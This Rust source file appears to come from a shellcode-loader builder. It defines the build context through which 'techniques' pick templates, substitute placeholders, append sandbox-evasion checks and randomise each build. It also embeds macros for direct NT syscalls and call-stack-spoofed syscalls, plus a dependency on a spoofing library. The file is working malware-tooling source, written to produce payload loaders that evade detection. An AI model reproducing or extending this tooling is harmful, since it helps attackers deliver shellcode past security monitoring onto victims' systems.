//! Mutable state passed into `Technique::apply` during build assembly.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use crate::polymorph::Polymorph;

/// Holds the in-progress build state. Techniques mutate this to:
///   - choose which template directory to copy (`set_template`)
///   - register placeholder substitutions (`set_replacement`)
///   - write files into the output's `src/` directory (`write_src_file`)
pub struct BuildContext<'a> {
    pub shellcode_path: &'a Path,
    pub output_folder: PathBuf,
    pub src_dir: PathBuf,
    pub replacements: HashMap<&'static str, String>,
    pub template_choice: Option<&'static str>, // template folder name under `templates/`
    pub params: &'a HashMap<String, String>,   // scoped: "<technique_id>.<param_name>"
    /// Shared per-build entropy. Techniques that need randomness pull it
    /// from here so the same `Order::seed` reproduces the build.
    pub polymorph: Polymorph,
}

impl<'a> BuildContext<'a> {
    pub fn set_template(&mut self, template_folder: &'static str) {
        self.template_choice = Some(template_folder);
    }

    pub fn set_replacement(&mut self, key: &'static str, value: String) {
        self.replacements.insert(key, value);
    }

    /// Concatenate `value` onto the existing replacement for `key` (or insert).
    /// Used for multi-contributor placeholders like {{SANDBOX}} where each
    /// evasion technique appends its own check.
    pub fn append_replacement(&mut self, key: &'static str, value: String) {
        self.replacements
            .entry(key)
            .and_modify(|v| {
                if !v.is_empty() && !v.ends_with('\n') {
                    v.push('\n');
                }
                v.push_str(&value);
            })
            .or_insert(value);
    }

    pub fn param(&self, technique_id: &str, param_name: &str) -> Option<&str> {
        let key = format!("{}.{}", technique_id, param_name);
        self.params.get(&key).map(String::as_str)
    }

    pub fn apply_exec_mode(&mut self, technique_id: &str) {
        let mode = self.param(technique_id, "exec_mode").unwrap_or("syscall");
        let (features, macro_body, extra_deps) = match mode {
            "callstack" => (
                "\"syscall\", \"spoof\", \"spoof-desync\"",
                CALLSTACK_NT_CALL_MACRO,
                CALLSTACK_EXTRA_DEPS,
            ),
            _ => ("\"syscall\"", SYSCALL_NT_CALL_MACRO, ""),
        };
        self.set_replacement("{{DYNCVOKE_FEATURES}}", features.to_string());
        self.set_replacement("{{NT_CALL_MACRO}}", macro_body.to_string());
        self.set_replacement("{{DYNCVOKE_EXTRA_DEPS}}", extra_deps.to_string());
    }
}

const SYSCALL_NT_CALL_MACRO: &str = r#"macro_rules! ntcall {
    ($name:expr $(, $arg:expr)* $(,)?) => {{
        let _n = data::lc!($name);
        dyncvoke_core::syscall!(_n.as_str() $(, $arg)*).unwrap() as i32
    }};
}"#;

const CALLSTACK_NT_CALL_MACRO: &str = r#"macro_rules! ntcall {
    ($name:expr $(, $arg:expr)* $(,)?) => {{
        let _n = data::lc!($name);
        spoof::spoof_syscall!(_n.as_str(), $($arg),*).unwrap() as i32
    }};
}"#;

const CALLSTACK_EXTRA_DEPS: &str = r#"spoof = { git = "https://git.smukx.site/smukx/Dyncvoke", features = ["desync"] }"#;
